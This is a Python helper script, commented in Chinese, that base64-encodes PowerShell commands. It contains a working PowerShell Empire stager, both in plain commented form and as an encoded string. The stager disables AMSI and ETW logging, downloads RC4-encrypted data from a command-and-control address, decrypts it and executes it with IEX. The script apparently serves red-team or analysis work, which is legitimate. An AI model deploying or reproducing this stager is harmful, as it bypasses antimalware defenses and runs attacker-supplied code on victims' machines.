import base64


def gen_enc_cmd(plain_cmd: str) -> str:
    """将 cmd 先 Unicode 编码然后 base64 编码"""
    utf_16_le_cmd = plain_cmd.encode("utf-16-le")
    utf_8_cmd = plain_cmd.encode("utf-8")
    utf_16_be_cmd = plain_cmd.encode("utf-16-be")
    base64_cmd = base64.b64encode(utf_8_cmd)
    base64_utf_16_le_cmd = base64.b64encode(utf_16_le_cmd)
    base64_utf_16_be_cmd = base64.b64encode(utf_16_be_cmd)

    print(f"UTF-8 编码: {utf_8_cmd}")
    print(f"UTF-16 LE 编码: {utf_16_le_cmd}")
    print(f"UTF-16 BE 编码: {utf_16_be_cmd}")
    print(f"Base64 编码: {base64_cmd}")
    print(f"Base64 UTF-16 LE 编码: {base64_utf_16_le_cmd}")
    print(f"Base64 UTF-16 BE 编码: {base64_utf_16_be_cmd}")


# gen_enc_cmd("whoami")


def encode_command(plain_cmd: str) -> str:
    """ "将 plain_cmd 先 utf-16 le 编码然后 base64 编码"""
    return base64.b64encode(plain_cmd.encode("utf-16-le"))


def decode_command(enc_cmd: str, encoding: str = "utf-16-le") -> str:
    """将 enc_cmd 先 base64 解码然后 utf-16 le 解码"""
    if encoding == "utf-16-le":
        return base64.b64decode(enc_cmd).decode("utf-16-le")
    return base64.b64decode(enc_cmd).decode(f"{encoding}")


# cmd = "whoami"
cmd = """
# 检查 PowerShell 版本是否为 3 及以上
If ($PSVersionTable.PSVersion.Major -ge 3) {
    # 禁用 AMSI (Antimalware Scan Interface) 以规避潜在的扫描
    $Ref = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');
    $Ref.GetField('amsiInitFailed', 'NonPublic,Static').SetValue($Null, $true);

    # 禁用 PowerShell 的 ETW (Event Tracing for Windows) 日志记录
    [System.Diagnostics.Eventing.EventProvider].GetField('m_enabled', 'NonPublic,Instance').SetValue(
        [Ref].Assembly.GetType(
            'System.Management.Automation.Tracing.PSEtwLogProvider'
        ).GetField(
            'etwProvider', 'NonPublic,Static'
        ).GetValue($null), 
        0
    );
}

# 禁用 HTTP 请求中的 "Expect: 100-Continue" 标头
[System.Net.ServicePointManager]::Expect100Continue = 0;

# 创建 System.Net.WebClient 类的新实例
$wc = New-Object System.Net.WebClient;

# 定义用于 HTTP 请求头的用户代理字符串
$u = 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';

# 解码并存储 base64 编码的服务器 URL
# "h\u0000t\u0000t\u0000p\u0000:\u0000/\u0000/\u00001\u00000\u00000\u0000.\u00001\u0000.\u00001\u0000.\u00001\u00003\u00006\u0000:\u00009\u00000\u00009\u00000\u0000"
# "http://100.1.1.136:9090"
$ser = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwAxADAAMAAuADEALgAxAC4AMQAzADYAOgA5ADAAOQAwAA==')));

# 定义目标 URL 路径
$t = '/login/process.php';

# 将用户代理标头添加到 Web 客户端
$wc.Headers.Add('User-Agent', $u);

# 配置 Web 客户端以使用默认的系统代理设置
$wc.Proxy = [System.Net.WebRequest]::DefaultWebProxy;
$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;
$Script:Proxy = $wc.Proxy;

# 将加密密钥转换为 ASCII 字节
$K = [System.Text.Encoding]::ASCII.GetBytes('Huv,3gtsc}#_E:fFXwn2bUPV|iMe0+5R');

# 定义用于自定义加密算法的函数
$R = {
    $D, $K = $Args;
    $S = 0..255;
    0..255 | % {
        $J = ($J + $S[$_] + $K[$_ % $K.Count]) % 256;
        $S[$_], $S[$J] = $S[$J], $S[$_];
    };
    $D | % {
        $I = ($I + 1) % 256;
        $H = ($H + $S[$I]) % 256;
        $S[$I], $S[$H] = $S[$H], $S[$I];
        $_ -bxor $S[($S[$I] + $S[$H]) % 256];
    };
};

# 将特定的 Cookie 添加到 Web 客户端标头
$wc.Headers.Add("Cookie", "cHGAfdLZDCEtLMK=lLq8UwiEuzvIQD4j7p6IJshii1E=");

# 从指定的 URL 下载数据并将其存储在 $data 中
$data = $wc.DownloadData($ser + $t);

# 从下载的数据中提取初始化向量 (IV)
$iv = $data[0..3];                 

# 从下载的数据中移除 IV
$data = $data[4..$data.length];

# 使用自定义加密函数对数据进行解密并执行
-join [Char[]](& $R $data ($IV + $K)) | IEX

"""
cmd = 'C:\Windows\System32\WindowsPowerShell\\v1.0\powershell.exe -noExit "whoami"'
print(f"原始命令为:\n{cmd}")


enc_cmd = encode_command(cmd)
print(f"{cmd} 编码后的命令为:\n{enc_cmd}")

# enc_cmd = "SQBuAHYAbwBrAGUALQBXAG0AaQBNAGUAdABoAG8AZAAgAC0AUABhAHQAaAAgAHcAaQBuADMAMgBfAHAAcgBvAGMAZQBzAHMAIAAtAE4AYQBtAGUAIABjAHIAZQBhAHQAZQAgAC0AQQByAGcAdQBtAGUAbgB0AEwAaQBzAHQAIABuAG8AdABlAHAAYQBkAC4AZQB4AGUA"
enc_cmd = "SQBmACgAJABQAFMAVgBlAHIAcwBpAG8AbgBUAGEAYgBsAGUALgBQAFMAVgBlAHIAcwBpAG8AbgAuAE0AYQBqAG8AcgAgAC0AZwBlACAAMwApAHsAJABSAGUAZgA9AFsAUgBlAGYAXQAuAEEAcwBzAGUAbQBiAGwAeQAuAEcAZQB0AFQAeQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAOwAkAFIAZQBmAC4ARwBlAHQARgBpAGUAbABkACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAdAB2AGEAbAB1AGUAKAAkAE4AdQBsAGwALAAkAHQAcgB1AGUAKQA7AFsAUwB5AHMAdABlAG0ALgBEAGkAYQBnAG4AbwBzAHQAaQBjAHMALgBFAHYAZQBuAHQAaQBuAGcALgBFAHYAZQBuAHQAUAByAG8AdgBpAGQAZQByAF0ALgBHAGUAdABGAGkAZQBsAGQAKAAnAG0AXwBlAG4AYQBiAGwAZQBkACcALAAnAE4AbwBuAFAAdQBiAGwAaQBjACwASQBuAHMAdABhAG4AYwBlACcAKQAuAFMAZQB0AFYAYQBsAHUAZQAoAFsAUgBlAGYAXQAuAEEAcwBzAGUAbQBiAGwAeQAuAEcAZQB0AFQAeQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBUAHIAYQBjAGkAbgBnAC4AUABTAEUAdAB3AEwAbwBnAFAAcgBvAHYAaQBkAGUAcgAnACkALgBHAGUAdABGAGkAZQBsAGQAKAAnAGUAdAB3AFAAcgBvAHYAaQBkAGUAcgAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAEcAZQB0AFYAYQBsAHUAZQAoACQAbgB1AGwAbAApACwAMAApADsAfQA7AFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoARQB4AHAAZQBjAHQAMQAwADAAQwBvAG4AdABpAG4AdQBlAD0AMAA7ACQAdwBjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQAdQA9ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAGkAbgBkAG8AdwBzACAATgBUACAANgAuADEAOwAgAFcATwBXADYANAA7ACAAVAByAGkAZABlAG4AdAAvADcALgAwADsAIAByAHYAOgAxADEALgAwACkAIABsAGkAawBlACAARwBlAGMAawBvACcAOwAkAHMAZQByAD0AJAAoAFsAVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBVAG4AaQBjAG8AZABlAC4ARwBlAHQAUwB0AHIAaQBuAGcAKABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACcAYQBBAEIAMABBAEgAUQBBAGMAQQBBADYAQQBDADgAQQBMAHcAQQB4AEEARABBAEEATQBBAEEAdQBBAEQARQBBAEwAZwBBAHgAQQBDADQAQQBNAFEAQQB6AEEARABnAEEATwBnAEEANQBBAEQAQQBBAE8AUQBBAHcAQQBBAD0APQAnACkAKQApADsAJAB0AD0AJwAvAG4AZQB3AHMALgBwAGgAcAAnADsAJAB3AGMALgBIAGUAYQBkAGUAcgBzAC4AQQBkAGQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJAB3AGMALgBQAHIAbwB4AHkAPQBbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBSAGUAcQB1AGUAcwB0AF0AOgA6AEQAZQBmAGEAdQBsAHQAVwBlAGIAUAByAG8AeAB5ADsAJAB3AGMALgBQAHIAbwB4AHkALgBDAHIAZQBkAGUAbgB0AGkAYQBsAHMAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AQwByAGUAZABlAG4AdABpAGEAbABDAGEAYwBoAGUAXQA6ADoARABlAGYAYQB1AGwAdABOAGUAdAB3AG8AcgBrAEMAcgBlAGQAZQBuAHQAaQBhAGwAcwA7ACQAUwBjAHIAaQBwAHQAOgBQAHIAbwB4AHkAIAA9ACAAJAB3AGMALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkALgBHAGUAdABCAHkAdABlAHMAKAAnAEgAcgBAAGMAVAB5ACgATgBNACUAUgBpAD0AWQBwADAAYQAqAEoAZwB6AEwAOABsAFEAfQBiAG8ANgBlAHMAWwAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAGcAcwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMAbwB1AG4AdABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBiAHgAbwByACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkAHcAYwAuAEgAZQBhAGQAZQByAHMALgBBAGQAZAAoACIAQwBvAG8AawBpAGUAIgAsACIAUgBmAFAATQBXAG8APQAvAEwAaABuADYASABJADEAVQBzAGUARwBIAEwAQgBKADkAWgBGADIAZwBRAE4AZABxAE4ANAA9ACIAKQA7ACQAZABhAHQAYQA9ACQAdwBjAC4ARABvAHcAbgBsAG8AYQBkAEQAYQB0AGEAKAAkAHMAZQByACsAJAB0ACkAOwAkAGkAdgA9ACQAZABhAHQAYQBbADAALgAuADMAXQA7ACQAZABhAHQAYQA9ACQAZABhAHQAYQBbADQALgAuACQAZABhAHQAYQAuAGwAZQBuAGcAdABoAF0AOwAtAGoAbwBpAG4AWwBDAGgAYQByAFsAXQBdACgAJgAgACQAUgAgACQAZABhAHQAYQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA"
dec_cmd = decode_command(enc_cmd)
print(f"{enc_cmd} 解码后的命令为:\n{dec_cmd}")
empire_base64_str = "aAB0AHQAcAA6AC8ALwAxADAAMAAuADEALgAxAC4AMQAzADgAOgA5ADAAOQAwAA=="
empire_plain_str = decode_command(empire_base64_str, "utf-8")
print(
    f"Empire base64 编码后的字符串为:\n{empire_base64_str}, 解码后的字符串为:\n{empire_plain_str}"
)
